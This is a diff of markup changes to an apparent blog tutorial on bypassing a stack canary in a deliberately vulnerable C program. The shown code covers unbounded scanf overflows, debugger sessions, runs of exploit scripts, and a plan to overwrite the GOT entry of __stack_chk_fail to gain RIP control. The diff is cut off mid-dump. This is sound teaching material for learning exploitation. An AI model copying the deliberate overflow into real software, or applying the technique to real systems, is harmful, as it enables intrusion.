@@ -88,7 +88,7 @@
 
 <h2>Vulnerable Code</h2>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -115,39 +115,41 @@
 <span class='line-number'>25</span>
 <span class='line-number'>26</span>
 <span class='line-number'>27</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>#include &lt;stdio.h&gt;
-</span><span class='line'>#include &lt;string.h&gt;
-</span><span class='line'>#include &lt;stdlib.h&gt;
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
 </span><span class='line'>
-</span><span class='line'>struct contact {
-</span><span class='line'>  char name[20];
-</span><span class='line'>  char *description;
-</span><span class='line'>};
+</span><span class='line'><span class="k">struct</span> <span class="n">contact</span> <span class="p">{</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
+</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">description</span><span class="p">;</span>
+</span><span class='line'><span class="p">};</span>
 </span><span class='line'>
-</span><span class='line'>void setup() {
-</span><span class='line'>  setvbuf(stdin, NULL, _IONBF, 0);
-</span><span class='line'>  setvbuf(stdout, NULL, _IONBF, 0);
-</span><span class='line'>  setvbuf(stderr, NULL, _IONBF, 0);
-</span><span class='line'>}
+</span><span class='line'><span class="kt">void</span> <span class="nf">setup</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">_IONBF</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
 </span><span class='line'>
-</span><span class='line'>int main() {
-</span><span class='line'>  struct contact c;
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">struct</span> <span class="n">contact</span> <span class="n">c</span><span class="p">;</span>
 </span><span class='line'>
-</span><span class='line'>  setup();
-</span><span class='line'>  memset(&c, 0, sizeof(c));
-</span><span class='line'>  c.description = malloc(100);
-</span><span class='line'>  puts("Enter name:");
-</span><span class='line'>  scanf("%s", c.name);
-</span><span class='line'>  puts("Enter description:");
-</span><span class='line'>  scanf("%s", c.description);
-</span><span class='line'>  return 0;
-</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>  <span class="n">setup</span><span class="p">();</span>
+</span><span class='line'>  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">c</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">c</span><span class="p">));</span>
+</span><span class='line'>  <span class="n">c</span><span class="p">.</span><span class="n">description</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Enter name:&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">c</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Enter description:&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">c</span><span class="p">.</span><span class="n">description</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>Compile the code through <code>gcc</code> with default <code>buffer overflow</code> protections.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>gcc vuln.c -o vuln</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">gcc</span> <span class="n">vuln</span><span class="p">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">vuln</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p><strong>Exploit Scenario</strong></p>
@@ -160,7 +162,7 @@
 
 <h2>Binary &amp; OS Protection</h2>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -171,17 +173,18 @@
 <span class='line-number'>9</span>
 <span class='line-number'>10</span>
 <span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># check binary protections:
-</span><span class='line'>─$ checksec vuln
-</span><span class='line'>[*] '/home/asinha/exploit-dev/vampire_class/bypass_canary_02/vuln'
-</span><span class='line'>    Arch:     amd64-64-little
-</span><span class='line'>    RELRO:    Partial RELRO
-</span><span class='line'>    Stack:    Canary found
-</span><span class='line'>    NX:       NX enabled
-</span><span class='line'>    PIE:      No PIE (0x400000)
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp"># check binary protections:</span>
+</span><span class='line'><span class="err">─$</span> <span class="n">checksec</span> <span class="n">vuln</span>
+</span><span class='line'><span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="err">&#39;</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">asinha</span><span class="o">/</span><span class="n">exploit</span><span class="o">-</span><span class="n">dev</span><span class="o">/</span><span class="n">vampire_class</span><span class="o">/</span><span class="n">bypass_canary_02</span><span class="o">/</span><span class="n">vuln</span><span class="err">&#39;</span>
+</span><span class='line'>    <span class="nl">Arch</span><span class="p">:</span>     <span class="n">amd64</span><span class="o">-</span><span class="mi">64</span><span class="o">-</span><span class="n">little</span>
+</span><span class='line'>    <span class="nl">RELRO</span><span class="p">:</span>    <span class="n">Partial</span> <span class="n">RELRO</span>
+</span><span class='line'>    <span class="nl">Stack</span><span class="p">:</span>    <span class="n">Canary</span> <span class="n">found</span>
+</span><span class='line'>    <span class="nl">NX</span><span class="p">:</span>       <span class="n">NX</span> <span class="n">enabled</span>
+</span><span class='line'>    <span class="nl">PIE</span><span class="p">:</span>      <span class="n">No</span> <span class="n">PIE</span> <span class="p">(</span><span class="mh">0x400000</span><span class="p">)</span>
 </span><span class='line'>
-</span><span class='line'># check ASLR status:
-</span><span class='line'>cat /proc/sys/kernel/randomize_va_space =&gt; 2 (ASLR enabled by default, most secure)</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'><span class="cp"># check ASLR status:</span>
+</span><span class='line'><span class="n">cat</span> <span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="n">sys</span><span class="o">/</span><span class="n">kernel</span><span class="o">/</span><span class="n">randomize_va_space</span> <span class="o">=&gt;</span> <span class="mi">2</span> <span class="p">(</span><span class="n">ASLR</span> <span class="n">enabled</span> <span class="n">by</span> <span class="k">default</span><span class="p">,</span> <span class="n">most</span> <span class="n">secure</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <h2>High Level Analysis</h2>
@@ -221,10 +224,11 @@
 </ul>
 
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>line 23: scanf("%s", c.name);  =&gt; %19s is not used
-</span><span class='line'>line 25: scanf("%s", c.description);  =&gt; %99s is not used</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">line</span> <span class="mi">23</span><span class="o">:</span> <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">c</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>  <span class="o">=&gt;</span> <span class="o">%</span><span class="mi">19</span><span class="n">s</span> <span class="n">is</span> <span class="n">not</span> <span class="n">used</span>
+</span><span class='line'><span class="n">line</span> <span class="mi">25</span><span class="o">:</span> <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%s&quot;</span><span class="p">,</span> <span class="n">c</span><span class="p">.</span><span class="n">description</span><span class="p">);</span>  <span class="o">=&gt;</span> <span class="o">%</span><span class="mi">99</span><span class="n">s</span> <span class="n">is</span> <span class="n">not</span> <span class="n">used</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <h4>Bug 2</h4>
@@ -239,10 +243,11 @@
 
 <h2>Static Analysis</h2>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>readelf -a vuln | grep -i "entry" =&gt; Entry point address:               0x400670
-</span><span class='line'>objdump -d -M intel vuln</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">readelf</span> <span class="o">-</span><span class="n">a</span> <span class="n">vuln</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">i</span> <span class="s">&quot;entry&quot;</span> <span class="o">=&gt;</span> <span class="n">Entry</span> <span class="n">point</span> <span class="nl">address</span><span class="p">:</span>               <span class="mh">0x400670</span>
+</span><span class='line'><span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="o">-</span><span class="n">M</span> <span class="n">intel</span> <span class="n">vuln</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p><img src="/downloads/code/2019/canary_bypass/image-20190711220750599.png" alt="image-20190711220750599.png" /></p>
@@ -253,8 +258,9 @@
 
 <p>Run <code>exploit_v01.py</code> to interact with the binary through <code>pwndbg</code>.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>python exploit_v01.py -m true local -b vuln -g true</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">python</span> <span class="n">exploit_v01</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">m</span> <span class="nb">true</span> <span class="n">local</span> <span class="o">-</span><span class="n">b</span> <span class="n">vuln</span> <span class="o">-</span><span class="n">g</span> <span class="nb">true</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 
@@ -474,8 +480,9 @@
 
 <p>Verify this hypothesis by analysing the memory stack.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>x/20gx $rsp</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">x</span><span class="o">/</span><span class="mi">20</span><span class="n">gx</span> <span class="err">$</span><span class="n">rsp</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p><img src="/downloads/code/2019/canary_bypass/image-20190727082108421.png" alt="image-20190727082108421" /></p>
@@ -484,18 +491,19 @@
 
 <h2>Understanding the stack layout</h2>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
 <span class='line-number'>5</span>
 <span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>0x7fffd9ce76b0: 0x4141414141414141      0x4141414141414141
-</span><span class='line'>                   |             |                      |
-</span><span class='line'>                   |             |                      this \x41 address is 0x7fffd9ce76b8
-</span><span class='line'>                   |             this \x41 address is 0x7fffd9ce76b0
-</span><span class='line'>                   |
-</span><span class='line'>                   this \x41 address is 0x7fffd9ce76b7</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x7fffd9ce76b0</span><span class="o">:</span> <span class="mh">0x4141414141414141</span>      <span class="mh">0x4141414141414141</span>
+</span><span class='line'>                   <span class="o">|</span>             <span class="o">|</span>                      <span class="o">|</span>
+</span><span class='line'>                   <span class="o">|</span>             <span class="o">|</span>                      <span class="n">this</span> <span class="err">\</span><span class="n">x41</span> <span class="n">address</span> <span class="n">is</span> <span class="mh">0x7fffd9ce76b8</span>
+</span><span class='line'>                   <span class="o">|</span>             <span class="n">this</span> <span class="err">\</span><span class="n">x41</span> <span class="n">address</span> <span class="n">is</span> <span class="mh">0x7fffd9ce76b0</span>
+</span><span class='line'>                   <span class="o">|</span>
+</span><span class='line'>                   <span class="n">this</span> <span class="err">\</span><span class="n">x41</span> <span class="n">address</span> <span class="n">is</span> <span class="mh">0x7fffd9ce76b7</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <h2>Summary</h2>
@@ -518,10 +526,11 @@
 
 <p>This is the address inside <code>___libc_start_main()</code>.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>pwndbg&gt; telescope 0x00007f9ccce51830
-</span><span class='line'>0x7f9ccce51830 (__libc_start_main+240) ◂— mov    edi, eax</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">telescope</span> <span class="mh">0x00007f9ccce51830</span>
+</span><span class='line'><span class="mh">0x7f9ccce51830</span> <span class="p">(</span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">240</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">mov</span>    <span class="n">edi</span><span class="p">,</span> <span class="n">eax</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>For every program restart, this <code>libc</code> address will be <code>changed</code> but the <code>offset</code> from <code>RSP</code> will remain the same.</p>
@@ -536,12 +545,13 @@
 </ol>
 
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># exploit strategy (high level)
-</span><span class='line'>input name = overwrite the heap_pointer address with some function's GOT address like put(), scanf()
-</span><span class='line'>input description = overwrite the libc address stored on the GOT entry with ROP to get RIP control</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp"># exploit strategy (high level)</span>
+</span><span class='line'><span class="n">input</span> <span class="n">name</span> <span class="o">=</span> <span class="n">overwrite</span> <span class="n">the</span> <span class="n">heap_pointer</span> <span class="n">address</span> <span class="n">with</span> <span class="n">some</span> <span class="n">function</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">GOT</span> <span class="n">address</span> <span class="n">like</span> <span class="n">put</span><span class="p">(),</span> <span class="n">scanf</span><span class="p">()</span>
+</span><span class='line'><span class="n">input</span> <span class="n">description</span> <span class="o">=</span> <span class="n">overwrite</span> <span class="n">the</span> <span class="n">libc</span> <span class="n">address</span> <span class="n">stored</span> <span class="n">on</span> <span class="n">the</span> <span class="n">GOT</span> <span class="n">entry</span> <span class="n">with</span> <span class="n">ROP</span> <span class="n">to</span> <span class="n">get</span> <span class="n">RIP</span> <span class="n">control</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <h2>Global Offset Table</h2>
@@ -562,8 +572,9 @@
 
 <p>In nutshell, whenever <code>__stack_chk_fail</code> is called then finally it goes to <code>.GOT</code> via <code>.PLT</code> and put the <code>value</code>(basically a libc address) stored into address(<code>0x0000000000601020</code>) inside <code>RIP</code>.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>.got.plt:0000000000601020 off_601020      dq offset __stack_chk_fail</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">.</span><span class="n">got</span><span class="p">.</span><span class="nl">plt</span><span class="p">:</span><span class="mo">0000000000601020</span> <span class="n">off_601020</span>      <span class="n">dq</span> <span class="n">offset</span> <span class="n">__stack_chk_fail</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>To get the <code>RIP</code> control, we need to overwrite the <code>value</code> (basically a libc address) stored on <code>0000000000601020</code> during run time.</p>
@@ -589,22 +600,24 @@
 
 <p>Usually, the following characters are treated as bad.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>0x0a =&gt; \n
-</span><span class='line'>0x0d =&gt; \t
-</span><span class='line'>0x20 =&gt; space</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x0a</span> <span class="o">=&gt;</span> <span class="err">\</span><span class="n">n</span>
+</span><span class='line'><span class="mh">0x0d</span> <span class="o">=&gt;</span> <span class="err">\</span><span class="n">t</span>
+</span><span class='line'><span class="mh">0x20</span> <span class="o">=&gt;</span> <span class="n">space</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>So <code>0x0000000000601020</code> has a bad char => <code>0x20</code> and we can&rsquo;t enter this address through our <code>name</code> input.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'># .GOT table structure
-</span><span class='line'>0x0000000000601018: puts() function pointer's address (in libc) =&gt; 8 bytes
-</span><span class='line'>0x0000000000601020:   __stack_chk_fail() function pointer's address (in libc) =&gt; (0x0000000000601020 - 0x0000000000601018) = 8 bytes</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp"># .GOT table structure</span>
+</span><span class='line'><span class="mh">0x0000000000601018</span><span class="o">:</span> <span class="n">puts</span><span class="p">()</span> <span class="n">function</span> <span class="n">pointer</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">address</span> <span class="p">(</span><span class="n">in</span> <span class="n">libc</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="mi">8</span> <span class="n">bytes</span>
+</span><span class='line'><span class="mh">0x0000000000601020</span><span class="o">:</span>    <span class="n">__stack_chk_fail</span><span class="p">()</span> <span class="n">function</span> <span class="n">pointer</span><span class="err">&#39;</span><span class="n">s</span> <span class="n">address</span> <span class="p">(</span><span class="n">in</span> <span class="n">libc</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">(</span><span class="mh">0x0000000000601020</span> <span class="o">-</span> <span class="mh">0x0000000000601018</span><span class="p">)</span> <span class="o">=</span> <span class="mi">8</span> <span class="n">bytes</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>Due to <code>ASLR</code> and <code>partial relro</code>, the value (basically a <code>libc</code> address) stored on those <code>GOT</code> addresses(i.e <code>0x0000000000601018</code>) will be changed on every program restart.</p>
@@ -613,24 +626,27 @@
 
 <p>Lets observe what values are stored on <code>0x0000000000601018</code> and <code>0x0000000000601020</code>.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>telescope 0x0000000000601018</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">telescope</span> <span class="mh">0x0000000000601018</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p><img src="/downloads/code/2019/canary_bypass/image-20190727084310718.png" alt="image-20190727084310718" /></p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>0x0000000000601018 =&gt; puts() address =&gt; 0x7fdf2d82c690
-</span><span class='line'>0x0000000000601020 =&gt; 0x400626 =&gt; reason: when the program stops, put() is called already ('Enter name:' in the screen) so GOT entry is loaded with libc address but through exploit_v01.py, we did not corrupt the canary so __stack_chk_fail() is not invoked.</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x0000000000601018</span> <span class="o">=&gt;</span> <span class="n">puts</span><span class="p">()</span> <span class="n">address</span> <span class="o">=&gt;</span> <span class="mh">0x7fdf2d82c690</span>
+</span><span class='line'><span class="mh">0x0000000000601020</span> <span class="o">=&gt;</span> <span class="mh">0x400626</span> <span class="o">=&gt;</span> <span class="nl">reason</span><span class="p">:</span> <span class="n">when</span> <span class="n">the</span> <span class="n">program</span> <span class="n">stops</span><span class="p">,</span> <span class="n">put</span><span class="p">()</span> <span class="n">is</span> <span class="n">called</span> <span class="n">already</span> <span class="p">(</span><span class="err">&#39;</span><span class="n">Enter</span> <span class="nl">name</span><span class="p">:</span><span class="err">&#39;</span> <span class="n">in</span> <span class="n">the</span> <span class="n">screen</span><span class="p">)</span> <span class="n">so</span> <span class="n">GOT</span> <span class="n">entry</span> <span class="n">is</span> <span class="n">loaded</span> <span class="n">with</span> <span class="n">libc</span> <span class="n">address</span> <span class="n">but</span> <span class="n">through</span> <span class="n">exploit_v01</span><span class="p">.</span><span class="n">py</span><span class="p">,</span> <span class="n">we</span> <span class="n">did</span> <span class="n">not</span> <span class="n">corrupt</span> <span class="n">the</span> <span class="n">canary</span> <span class="n">so</span> <span class="n">__stack_chk_fail</span><span class="p">()</span> <span class="n">is</span> <span class="n">not</span> <span class="n">invoked</span><span class="p">.</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <h2>Corrupt the Canary</h2>
 
 <p>Lets corrupt the <code>canary</code> with <code>exploit_v02.py</code> and verify the <code>__stack_chk_fail()</code> <code>GOT</code> entry.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>python exploit_v02.py -m true local -b vuln -g true</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">python</span> <span class="n">exploit_v02</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">m</span> <span class="nb">true</span> <span class="n">local</span> <span class="o">-</span><span class="n">b</span> <span class="n">vuln</span> <span class="o">-</span><span class="n">g</span> <span class="nb">true</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 
@@ -846,18 +862,20 @@
 
 <p>Set the breakpoint before the call of <code>__stack_chk_fail()</code> function.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>pwndbg&gt; disassemble main
-</span><span class='line'>pwndbg&gt; b *0x0000000000400859</span></code></pre></td></tr></table></div></figure>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">disassemble</span> <span class="n">main</span>
+</span><span class='line'><span class="n">pwndbg</span><span class="o">&gt;</span> <span class="n">b</span> <span class="o">*</span><span class="mh">0x0000000000400859</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p>When we hit this break point,<code>.GOT</code> will not have the <code>__stack_chk_fail()</code> libc address as it is calling first time so it is not loaded yet.</p>
 
 <p>set another breakpoint at <code>__stack_chk_fail</code> function.</p>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>break __stack_chk_fail</span></code></pre></td></tr></table></div></figure>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">break</span> <span class="n">__stack_chk_fail</span>
+</span></code></pre></td></tr></table></div></figure>
 
 
 <p><img src="/downloads/code/2019/canary_bypass/image-20190727085847861.png" alt="image-20190727085847861" /></p>
@@ -874,7 +892,7 @@
 
 <h2>Analyse the <code>.GOT</code> of <code>puts()</code></h2>
 
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
 <span class='line-number'>4</span>
@@ -888,20 +906,21 @@
 <span class='line-number'>12</span>
 <span class='line-number'>13</span>
 <span class='line-number'>14</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>0x0000000000601018 (_GLOBAL_OFFSET_TABLE_+24) —▸ 0x7fbc0e4c4690 (puts) ◂— push   r12
-</span><span class='line'>0x0000000000601020 (_GLOBAL_OFFSET_TABLE_+32) —▸ 0x7fbc0e56e0f0 (__stack_chk_fail)
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x0000000000601018</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">24</span><span class="p">)</span> <span class="err">—▸</span> <span class="mh">0x7fbc0e4c4690</span> <span class="p">(</span><span class="n">puts</span><span class="p">)</span> <span class="err">◂—</span> <span class="n">push</span>   <span class="n">r12</span>
+</span><span class='line'><span class="mh">0x0000000000601020</span> <span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="o">+</span><span class="mi">32</span><span class="p">)</span> <span class="err">—▸</span> <span class="mh">0x7fbc0e56e0f0</span> <span class="p">(</span><span class="n">__stack_chk_fail</span><span class="p">)</span>
 </span><span class='line'>
-</span><span class='line'># 0x601020 - 0x601018 = 8 bytes
+</span><span class='line'><span class="cp"># 0x601020 - 0x601018 = 8 bytes</span>
 </span><span class='line'>
-</span><span class='line'>[+] analyse puts() GOT entry
-</span><span class='line'>value stored on the 1st byte : 0x0000000000601018 =&gt; \x90
-</span><span class='line'>value stored on the 2nd byte : 0x0000000000601019 =&gt; \x46
-</span><span class='line'>value stored on the 3rd byte : 0x000000000060101a =&gt; \x4c
-</span><span class='line'>value stored on the 4th byte : 0x000000000060101b =&gt; \x0e
-</span><span class='line'>value stored on the 5th byte : 0x000000000060101c =&gt; \xbc
-</span><span class='line'>value stored on the 6th byte : 0x000000000060101d =&gt; \x7f
-</span><span class='line'>value stored on the 7th byte : 0x000000000060101e =&gt; \x00
